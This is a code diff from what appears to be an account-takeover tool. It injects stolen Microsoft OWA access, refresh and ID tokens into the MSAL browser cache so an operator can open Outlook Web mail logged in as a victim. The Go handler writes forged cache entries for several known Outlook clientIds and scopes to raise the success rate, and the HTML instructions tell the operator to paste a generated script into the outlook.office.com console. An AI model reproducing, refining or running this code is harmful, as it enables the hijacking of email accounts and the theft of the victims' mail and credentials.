@@ -1021,27 +1021,50 @@ func jwtStr(m map[string]interface{}, key string) string {
 	return ""
 }
 
-// extractOWAClientID fetches the OWA boot HTML and extracts the MSAL clientId
-// from the embedded JSON boot config.  Falls back to the known OWA value.
+// owaKnownClientIDs lists all known OWA MSAL clientIds across versions.
+// We write the MSAL cache for ALL of them so at least one matches.
+// Primary (current as of 2025-2026): 9199bf20-a13f-4107-85dc-02114787ef48
+var owaKnownClientIDs = []string{
+	"9199bf20-a13f-4107-85dc-02114787ef48", // current OWA MSAL clientId (2025+)
+	"7716031e-6f8b-45a4-b82b-922b1af0fbb8", // older OWA clientId
+	"4765445b-32c6-49b0-83e6-1d93765276ca", // OWA legacy fallback
+}
+
+// extractOWAClientID fetches the OWA boot HTML and extracts the MSAL clientId.
+// Falls back to the known primary value if extraction fails.
 func extractOWAClientID(at string) string {
 	req, err := http.NewRequest("GET", "https://outlook.office.com/mail/", nil)
 	if err != nil {
-		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+		return owaKnownClientIDs[0]
 	}
 	req.Header.Set("Authorization", "Bearer "+at)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36")
-	resp, err := http.DefaultClient.Do(req)
+	client := &http.Client{
+		Timeout: 12 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) > 8 {
+				return http.ErrUseLastResponse
+			}
+			req.Header.Set("Authorization", "Bearer "+at)
+			return nil
+		},
+	}
+	resp, err := client.Do(req)
 	if err != nil {
-		return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+		return owaKnownClientIDs[0]
 	}
 	defer resp.Body.Close()
 	body, _ := io.ReadAll(resp.Body)
 
 	re := regexp.MustCompile(`"clientId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"`)
 	if m := re.FindSubmatch(body); len(m) > 1 {
-		return string(m[1])
+		found := string(m[1])
+		// Sanity check: must not be the device-code client or generic MS app
+		if found != "d3590ed6-52b3-4102-aeff-aad2292ab01c" {
+			return found
+		}
 	}
-	return "7716031e-6f8b-45a4-b82b-922b1af0fbb8"
+	return owaKnownClientIDs[0]
 }
 
 func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
@@ -1218,54 +1241,79 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		idtKey:     idtVal,
 	}
 
-	// Write AT/RT cache entries for every scope variant so MSAL finds a match
-	// regardless of which exact scope string OWA's version uses for lookup.
-	for _, sv := range scopeVariants {
-		if sv == scope {
-			continue // already written above
+	// Build the full set of clientIds to cover — extracted + all known variants.
+	// OWA changed clientId in 2025 to 9199bf20; writing for all ensures we hit
+	// whichever version is currently deployed on the victim's tenant.
+	allClientIDs := []string{owaClientID}
+	for _, kid := range owaKnownClientIDs {
+		if kid != owaClientID {
+			allClientIDs = append(allClientIDs, kid)
 		}
-		extraATKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, sv))
-		extraRTKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, sv))
-		extraATVal := map[string]interface{}{
-			"cachedAt": now, "clientId": owaClientID, "credentialType": "AccessToken",
-			"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
-			"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
-			"target": sv, "tokenType": "Bearer",
-		}
-		extraRTVal := map[string]interface{}{
-			"clientId": owaClientID, "credentialType": "RefreshToken",
-			"environment": env, "homeAccountId": homeAccountID,
-			"secret": owaRT, "target": sv,
-		}
-		entries[extraATKey] = extraATVal
-		entries[extraRTKey] = extraRTVal
 	}
 
-	// MSAL v2 requires "msal.account.keys" (account index) AND
-	// "msal.token.keys.{clientId}" (credential index) to discover cached tokens.
-	// Without the token-keys index MSAL silently ignores all cached credentials
-	// and falls back to interactive login — this is the #1 cause of inject failures.
-	entries["msal.account.keys"] = []string{accountKey}
-
-	// Build the credential key lists for the token-keys index.
-	var atKeys, rtKeys []string
-	for k, v := range entries {
-		if vm, ok := v.(map[string]interface{}); ok {
-			ct, _ := vm["credentialType"].(string)
-			switch ct {
-			case "AccessToken":
-				atKeys = append(atKeys, k)
-			case "RefreshToken":
-				rtKeys = append(rtKeys, k)
+	// Write AT/RT/IDT cache entries for every (clientId × scope) combination.
+	for _, cid := range allClientIDs {
+		for _, sv := range scopeVariants {
+			ck := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, cid, tid, sv))
+			rk := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, cid, sv))
+			ik := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, cid, tid))
+			if _, exists := entries[ck]; !exists {
+				entries[ck] = map[string]interface{}{
+					"cachedAt": now, "clientId": cid, "credentialType": "AccessToken",
+					"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
+					"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
+					"target": sv, "tokenType": "Bearer",
+				}
+			}
+			if _, exists := entries[rk]; !exists {
+				entries[rk] = map[string]interface{}{
+					"clientId": cid, "credentialType": "RefreshToken",
+					"environment": env, "homeAccountId": homeAccountID,
+					"secret": owaRT, "target": sv,
+				}
+			}
+			if _, exists := entries[ik]; !exists {
+				entries[ik] = map[string]interface{}{
+					"clientId": cid, "credentialType": "IdToken",
+					"environment": env, "homeAccountId": homeAccountID,
+					"realm": tid, "secret": idt,
+				}
 			}
 		}
 	}
-	entries["msal.token.keys."+owaClientID] = map[string]interface{}{
-		"accessToken":  atKeys,
-		"idToken":      []string{idtKey},
-		"refreshToken": rtKeys,
+
+	// MSAL requires msal.account.keys AND msal.token.keys.{clientId} as indices.
+	// Without the token-keys index MSAL ignores all cached credentials and
+	// redirects to interactive login. Write the index for every known clientId.
+	entries["msal.account.keys"] = []string{accountKey}
+
+	// Build credential key lists per clientId for the token-keys index.
+	for _, cid := range allClientIDs {
+		var cAtKeys, cRtKeys, cIdtKeys []string
+		for k, v := range entries {
+			vm, ok := v.(map[string]interface{})
+			if !ok {
+				continue
+			}
+			if vm["clientId"] != cid {
+				continue
+			}
+			switch vm["credentialType"] {
+			case "AccessToken":
+				cAtKeys = append(cAtKeys, k)
+			case "RefreshToken":
+				cRtKeys = append(cRtKeys, k)
+			case "IdToken":
+				cIdtKeys = append(cIdtKeys, k)
+			}
+		}
+		entries["msal.token.keys."+cid] = map[string]interface{}{
+			"accessToken":  cAtKeys,
+			"idToken":      cIdtKeys,
+			"refreshToken": cRtKeys,
+		}
 	}
-	// Clear any stale interaction-in-progress flag that can block silent auth.
+	// Clear any stale interaction-in-progress flag that blocks silent auth.
 	entries["msal.interaction.status"] = ""
 
 	// ── Server-side OWA warm-up: hit outlook.office.com with bearer so
@@ -1372,14 +1420,15 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <div class="card" style="border-color:#1a3a5c">
 <h2 style="color:#4a9fd4">Steps (read carefully)</h2>
 <ol class="steps">
-<li>Click <strong>Copy Script</strong> below first — copy it to clipboard NOW before opening OWA</li>
-<li>Click <strong>Open OWA Page</strong> — this opens outlook.office.com in a new tab (it may show a login page — that is fine, stay on it)</li>
-<li>In the new tab, press <strong>F12</strong> → <strong>Console</strong> — confirm the URL bar says <strong>outlook.office.com</strong></li>
-<li>Paste the script in console → press <strong>Enter</strong> — it will auto-navigate to <strong>/mail/</strong> logged in as <strong>%s</strong></li>
+<li>Click <strong>Copy Script</strong> first — have it ready in clipboard</li>
+<li>Click <strong>Open OWA Page</strong> — opens <code style="color:#aaa">outlook.office.com/mail/</code> in new tab<br>
+  <span style="color:#777;font-size:11px">It will redirect to Microsoft login — that is normal and expected</span></li>
+<li>In the new tab: press <strong>F12</strong> → <strong>Console</strong> tab immediately (even if page is loading or on login)</li>
+<li>Paste the script → press <strong>Enter</strong> — you will see <span style="color:#0a0;font-weight:700">✓ OWA tokens written</span> in console, then auto-navigate to /mail/ as <strong>%s</strong></li>
 </ol>
 <p style="font-size:12px;color:#888;margin-top:10px;padding-left:12px">
-⚠ <strong style="color:#ccc">Do NOT reload</strong> the OWA page manually after pasting — the script navigates automatically.<br>
-⚠ If OWA still redirects to login, wait 3 seconds and try again — MSAL may need one extra load to pick up the cache.
+⚠ The script sets the token cache on the <strong>outlook.office.com</strong> origin. It works even if the tab currently shows the Microsoft login page — the origin is still correct.<br>
+⚠ If /mail/ still redirects after paste, open console again and paste once more — MSAL sometimes needs two boots.
 </p>
 </div>
 <div class="card">
@@ -1387,7 +1436,7 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
 <button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://outlook.office.com/owa/auth/logon.aspx?url=https://outlook.office.com/owa/&amp;reason=0" target="_blank">Open OWA Page</a>
+<a class="btn b2" href="https://outlook.office.com/mail/" target="_blank">Open OWA Page</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
 <p class="note">If copy fails: click inside the text box → Ctrl+A → Ctrl+C → paste in OWA console</p>
